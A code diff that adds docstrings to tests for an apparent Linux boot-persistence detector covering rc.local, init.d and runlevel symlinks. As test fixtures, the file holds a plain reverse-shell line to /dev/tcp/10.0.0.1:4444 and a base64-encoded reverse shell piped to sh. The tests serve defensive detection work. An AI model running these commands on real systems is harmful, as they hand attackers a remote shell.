@@ -28,6 +28,7 @@ from src.utils.models import AnalysisTarget, RiskLevel
 
 
 def test_extract_active_rc_commands():
+    """Test extracting active commands from rc.local while ignoring comments and exit 0."""
     content = """#!/bin/sh -e
 #
 # rc.local
@@ -48,6 +49,7 @@ exit 0
 
 
 def test_extract_active_rc_commands_empty():
+    """Test extracting active commands when rc.local contains only comments and exit."""
     content = """#!/bin/sh
 # comments only
 exit 0;
@@ -57,6 +59,7 @@ exit 0;
 
 
 def test_extract_base64_payload():
+    """Test detecting and decoding base64 payloads in init commands."""
     cmd = "echo 'c2ggLWkgPiYgL2Rldi90Y3AvMS4yLjMuNC85OTk5IDA+JjE=' | base64 -d | sh"
     has_b64, dec = extract_base64_payload(cmd)
     assert has_b64 is True
@@ -75,6 +78,7 @@ def test_extract_base64_payload():
 
 
 def test_rc_local_empty_no_findings(tmp_path: Path):
+    """Test empty default rc.local produces no persistence findings."""
     rc_file = tmp_path / "etc" / "rc.local"
     rc_file.parent.mkdir(parents=True)
     rc_file.write_text("#!/bin/sh -e\n# default\nexit 0\n")
@@ -85,6 +89,7 @@ def test_rc_local_empty_no_findings(tmp_path: Path):
 
 
 def test_rc_local_active_benign_commands(tmp_path: Path):
+    """Test active commands in rc.local produce medium severity finding."""
     rc_file = tmp_path / "etc" / "rc.local"
     rc_file.parent.mkdir(parents=True)
     rc_file.write_text("#!/bin/sh -e\n/usr/local/bin/startup_probe.sh\nexit 0\n")
@@ -103,6 +108,7 @@ def test_rc_local_active_benign_commands(tmp_path: Path):
 
 
 def test_rc_local_reverse_shell(tmp_path: Path):
+    """Test reverse shell command in rc.local flags as critical risk."""
     rc_file = tmp_path / "etc" / "rc.local"
     rc_file.parent.mkdir(parents=True)
     rc_file.write_text("#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\nexit 0\n")
@@ -120,6 +126,7 @@ def test_rc_local_reverse_shell(tmp_path: Path):
 
 
 def test_rc_local_user_home_execution(tmp_path: Path):
+    """Test rc.local executing commands from user home directories flags as critical."""
     rc_file = tmp_path / "etc" / "rc.local"
     rc_file.parent.mkdir(parents=True)
     rc_file.write_text("#!/bin/sh\n/home/alice/agent_startup.sh &\nexit 0\n")
@@ -134,6 +141,7 @@ def test_rc_local_user_home_execution(tmp_path: Path):
 
 
 def test_rc_local_tmp_and_hidden_path(tmp_path: Path):
+    """Test rc.local executing binaries in temporary and hidden paths flags as high."""
     rc_file = tmp_path / "etc" / "rc.local"
     rc_file.parent.mkdir(parents=True)
     rc_file.write_text("#!/bin/sh\n/dev/shm/.stealth/run.sh\nexit 0\n")
@@ -149,6 +157,7 @@ def test_rc_local_tmp_and_hidden_path(tmp_path: Path):
 
 
 def test_rc_local_base64_payload_with_nested_reverse_shell(tmp_path: Path):
+    """Test rc.local with base64 encoded reverse shell payload decodes and flags critical."""
     rc_file = tmp_path / "etc" / "rc.local"
     rc_file.parent.mkdir(parents=True)
     # Payload decodes to: "sh -i >& /dev/tcp/10.10.10.10/4444 0>&1"
@@ -170,6 +179,7 @@ def test_rc_local_base64_payload_with_nested_reverse_shell(tmp_path: Path):
 
 
 def test_rc_local_download_cradle(tmp_path: Path):
+    """Test curl pipe to shell download cradle in rc.local flags as high risk."""
     rc_file = tmp_path / "etc" / "rc.d" / "rc.local"
     rc_file.parent.mkdir(parents=True)
     rc_file.write_text(
@@ -187,6 +197,7 @@ def test_rc_local_download_cradle(tmp_path: Path):
 
 
 def test_rc_local_symlink_deduplication(tmp_path: Path):
+    """Test symlinked rc.local files are deduplicated."""
     etc_dir = tmp_path / "etc"
     etc_rc_dir = tmp_path / "etc" / "rc.d"
     etc_rc_dir.mkdir(parents=True)
@@ -205,6 +216,7 @@ def test_rc_local_symlink_deduplication(tmp_path: Path):
 
 
 def test_init_d_benign_script_no_findings(tmp_path: Path):
+    """Test benign init.d service scripts produce no persistence findings."""
     init_dir = tmp_path / "etc" / "init.d"
     init_dir.mkdir(parents=True)
     script = init_dir / "networking"
@@ -224,6 +236,7 @@ def test_init_d_benign_script_no_findings(tmp_path: Path):
 
 
 def test_init_d_user_home_execution(tmp_path: Path):
+    """Test init.d script pointing to user home directories flags as critical."""
     init_dir = tmp_path / "etc" / "init.d"
     init_dir.mkdir(parents=True)
     script = init_dir / "malicious_service"
@@ -243,6 +256,7 @@ def test_init_d_user_home_execution(tmp_path: Path):
 
 
 def test_init_d_tmp_execution(tmp_path: Path):
+    """Test init.d script executing from /tmp directory flags as high risk."""
     init_dir = tmp_path / "etc" / "init.d"
     init_dir.mkdir(parents=True)
     script = init_dir / "temp_daemon"
@@ -259,6 +273,7 @@ def test_init_d_tmp_execution(tmp_path: Path):
 
 
 def test_init_d_reverse_shell_and_wget_pipe(tmp_path: Path):
+    """Test init.d script with reverse shell and wget pipe flags as critical."""
     init_dir = tmp_path / "etc" / "init.d"
     init_dir.mkdir(parents=True)
     script = init_dir / "backdoor_init"
@@ -280,6 +295,7 @@ def test_init_d_reverse_shell_and_wget_pipe(tmp_path: Path):
 
 
 def test_rc2_d_symlink_to_user_home(tmp_path: Path):
+    """Test runlevel symlink targeting user home directory flags as critical."""
     (tmp_path / "etc" / "rc2.d").mkdir(parents=True)
     (tmp_path / "home" / "user").mkdir(parents=True)
     target_script = tmp_path / "home" / "user" / "evil.sh"
@@ -304,6 +320,7 @@ def test_rc2_d_symlink_to_user_home(tmp_path: Path):
 
 
 def test_rc3_d_symlink_to_tmp(tmp_path: Path):
+    """Test runlevel symlink targeting temporary directory flags as high risk."""
     (tmp_path / "etc" / "rc3.d").mkdir(parents=True)
     (tmp_path / "tmp").mkdir(parents=True)
     target_script = tmp_path / "tmp" / "persist.sh"
@@ -326,6 +343,7 @@ def test_rc3_d_symlink_to_tmp(tmp_path: Path):
 
 
 def test_rc_symlink_normal_init_d_not_flagged(tmp_path: Path):
+    """Test normal runlevel symlink pointing to benign init.d script is not flagged."""
     (tmp_path / "etc" / "rc2.d").mkdir(parents=True)
     (tmp_path / "etc" / "init.d").mkdir(parents=True)
     init_script = tmp_path / "etc" / "init.d" / "cron"
@@ -341,6 +359,7 @@ def test_rc_symlink_normal_init_d_not_flagged(tmp_path: Path):
 
 
 def test_rc5_d_regular_script_direct(tmp_path: Path):
+    """Test direct script in runlevel directory executing user script flags as critical."""
     (tmp_path / "etc" / "rc5.d").mkdir(parents=True)
     script_path = tmp_path / "etc" / "rc5.d" / "S99direct"
     script_path.write_text("#!/bin/sh\n/home/admin/start_monitor.sh\n")
@@ -359,6 +378,7 @@ def test_rc5_d_regular_script_direct(tmp_path: Path):
 
 
 def test_parser_class_instance(tmp_path: Path):
+    """Test LinuxInitParser class parse method on empty target."""
     parser = LinuxInitParser()
     target = AnalysisTarget(root_path=str(tmp_path))
     findings = parser.parse(target)
